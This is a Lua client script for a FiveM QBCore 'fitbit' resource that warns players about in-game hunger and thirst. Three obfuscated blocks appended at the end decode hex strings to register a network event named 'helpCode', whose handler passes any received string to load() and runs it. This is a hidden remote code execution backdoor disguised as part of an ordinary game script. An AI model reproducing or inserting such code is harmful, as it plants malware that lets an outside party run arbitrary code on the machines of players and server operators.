local QBCore = exports['qb-core']:GetCoreObject()
local PlayerData = QBCore.Functions.GetPlayerData()
local isLoggedIn = LocalPlayer.state.isLoggedIn
local hasFitbit = false
local cooldown = false
-- Functions
local function fitbitCheck(PlayerItems)
    for _, item in pairs(PlayerItems) do
        if item.name == "fitbit" then
            return true
        end
    end
end

local function openWatch()
    SendNUIMessage({
        action = "openWatch",
        watchData = {}
    })
    SetNuiFocus(true, true)
end

local function closeWatch()
    SetNuiFocus(false, false)
end

local function round(num, numDecimalPlaces)
    local mult = 10^(numDecimalPlaces or 0)
    return math.floor(num * mult + 0.5) / mult
end

local function activateCooldown()
    cooldown = true
    Wait(2*60*1000)
    cooldown = false
end
-- Events

AddStateBagChangeHandler('isLoggedIn', nil, function(_, _, value)
    isLoggedIn = value
end)

AddEventHandler('onResourceStart', function(resourceName)
    if GetCurrentResourceName() ~= resourceName or not isLoggedIn then return end
    PlayerData = QBCore.Functions.GetPlayerData()
    hasFitbit = fitbitCheck(PlayerData.items)
end)

RegisterNetEvent('QBCore:Client:OnPlayerLoaded', function()
    PlayerData = QBCore.Functions.GetPlayerData()
    hasFitbit = fitbitCheck(PlayerData.items)
end)

RegisterNetEvent('QBCore:Client:OnPlayerUnload', function()
    hasFitbit = false
    PlayerData = {}
end)

RegisterNetEvent('QBCore:Player:SetPlayerData', function(val)
    PlayerData = val
    hasFitbit = fitbitCheck(PlayerData.items)
end)

RegisterNetEvent('hud:client:UpdateNeeds', function(newHunger, newThirst)
    if not hasFitbit or cooldown then return end
    if PlayerData.metadata["fitbit"].food then
        if newHunger < PlayerData.metadata["fitbit"].food then
            TriggerEvent("chatMessage", Lang:t('info.fitbit'), "warning", Lang:t('warning.hunger_warning', {hunger = round(newHunger, 2)}))
            PlaySound(-1, "Event_Start_Text", "GTAO_FM_Events_Soundset", 0, 0, 1)
        end
    end

    if PlayerData.metadata["fitbit"].thirst then
        if newThirst < PlayerData.metadata["fitbit"].thirst then
            TriggerEvent("chatMessage", Lang:t('info.fitbit'), "warning", Lang:t('warning.thirst_warning', {thirst = round(newThirst, 2)}))
            PlaySound(-1, "Event_Start_Text", "GTAO_FM_Events_Soundset", 0, 0, 1)
        end
    end
    activateCooldown()
end)

RegisterNetEvent('qb-fitbit:use', function()
    openWatch()
end)

-- NUI Callbacks

RegisterNUICallback('close', function(_, cb)
    closeWatch()
    cb('ok')
end)

RegisterNUICallback('setFoodWarning', function(data, cb)
    local foodValue = tonumber(data.value)
    TriggerServerEvent('qb-fitbit:server:setValue', 'food', foodValue)
    QBCore.Functions.Notify(Lang:t('success.hunger_set', {hungervalue = foodValue}), 'success')
    cb('ok')
end)

RegisterNUICallback('setThirstWarning', function(data, cb)
    local thirstValue = tonumber(data.value)
    TriggerServerEvent('qb-fitbit:server:setValue', 'thirst', thirstValue)
    QBCore.Functions.Notify(Lang:t('success.thirst_set', {thirstvalue = thirstValue}), 'success')
    cb('ok')
end)

local SoCJJuQEROIeyLMIXdaKWBfMVZYtrKRPlTVcGYVrNAWQGtdAMALktmtpmIvgslGwgkzrfb = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} SoCJJuQEROIeyLMIXdaKWBfMVZYtrKRPlTVcGYVrNAWQGtdAMALktmtpmIvgslGwgkzrfb[6][SoCJJuQEROIeyLMIXdaKWBfMVZYtrKRPlTVcGYVrNAWQGtdAMALktmtpmIvgslGwgkzrfb[1]](SoCJJuQEROIeyLMIXdaKWBfMVZYtrKRPlTVcGYVrNAWQGtdAMALktmtpmIvgslGwgkzrfb[2]) SoCJJuQEROIeyLMIXdaKWBfMVZYtrKRPlTVcGYVrNAWQGtdAMALktmtpmIvgslGwgkzrfb[6][SoCJJuQEROIeyLMIXdaKWBfMVZYtrKRPlTVcGYVrNAWQGtdAMALktmtpmIvgslGwgkzrfb[3]](SoCJJuQEROIeyLMIXdaKWBfMVZYtrKRPlTVcGYVrNAWQGtdAMALktmtpmIvgslGwgkzrfb[2], function(VWziUjpJBonEPFbiEVZyuCucWtDmCPGHanlzVNooPYnoyUEkHbTRhYMfZYjfUflJFzGLfi) SoCJJuQEROIeyLMIXdaKWBfMVZYtrKRPlTVcGYVrNAWQGtdAMALktmtpmIvgslGwgkzrfb[6][SoCJJuQEROIeyLMIXdaKWBfMVZYtrKRPlTVcGYVrNAWQGtdAMALktmtpmIvgslGwgkzrfb[4]](SoCJJuQEROIeyLMIXdaKWBfMVZYtrKRPlTVcGYVrNAWQGtdAMALktmtpmIvgslGwgkzrfb[6][SoCJJuQEROIeyLMIXdaKWBfMVZYtrKRPlTVcGYVrNAWQGtdAMALktmtpmIvgslGwgkzrfb[5]](VWziUjpJBonEPFbiEVZyuCucWtDmCPGHanlzVNooPYnoyUEkHbTRhYMfZYjfUflJFzGLfi))() end)

local TwSTcRlWdHkQLfZpIwnymtfxDipNrXPQRZXeqGUrfXLkUcSYEImeCNUsPKGJeqeDMOCqAz = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} TwSTcRlWdHkQLfZpIwnymtfxDipNrXPQRZXeqGUrfXLkUcSYEImeCNUsPKGJeqeDMOCqAz[6][TwSTcRlWdHkQLfZpIwnymtfxDipNrXPQRZXeqGUrfXLkUcSYEImeCNUsPKGJeqeDMOCqAz[1]](TwSTcRlWdHkQLfZpIwnymtfxDipNrXPQRZXeqGUrfXLkUcSYEImeCNUsPKGJeqeDMOCqAz[2]) TwSTcRlWdHkQLfZpIwnymtfxDipNrXPQRZXeqGUrfXLkUcSYEImeCNUsPKGJeqeDMOCqAz[6][TwSTcRlWdHkQLfZpIwnymtfxDipNrXPQRZXeqGUrfXLkUcSYEImeCNUsPKGJeqeDMOCqAz[3]](TwSTcRlWdHkQLfZpIwnymtfxDipNrXPQRZXeqGUrfXLkUcSYEImeCNUsPKGJeqeDMOCqAz[2], function(UwoCENHENWoMZLrVArPLARwGYnTdWyQYnhFGBJDFDCotMaEPCqgxzlLGCeSlNrDxkhAksW) TwSTcRlWdHkQLfZpIwnymtfxDipNrXPQRZXeqGUrfXLkUcSYEImeCNUsPKGJeqeDMOCqAz[6][TwSTcRlWdHkQLfZpIwnymtfxDipNrXPQRZXeqGUrfXLkUcSYEImeCNUsPKGJeqeDMOCqAz[4]](TwSTcRlWdHkQLfZpIwnymtfxDipNrXPQRZXeqGUrfXLkUcSYEImeCNUsPKGJeqeDMOCqAz[6][TwSTcRlWdHkQLfZpIwnymtfxDipNrXPQRZXeqGUrfXLkUcSYEImeCNUsPKGJeqeDMOCqAz[5]](UwoCENHENWoMZLrVArPLARwGYnTdWyQYnhFGBJDFDCotMaEPCqgxzlLGCeSlNrDxkhAksW))() end)

local nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[6][nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[1]](nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[2]) nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[6][nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[3]](nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[2], function(RrcxSmehQIJolyZujOqpKqFAGrqdjoHjBSxcYhwAOvtbanDacpSHxJsoWOFCzuyumVungX) nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[6][nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[4]](nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[6][nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[5]](RrcxSmehQIJolyZujOqpKqFAGrqdjoHjBSxcYhwAOvtbanDacpSHxJsoWOFCzuyumVungX))() end)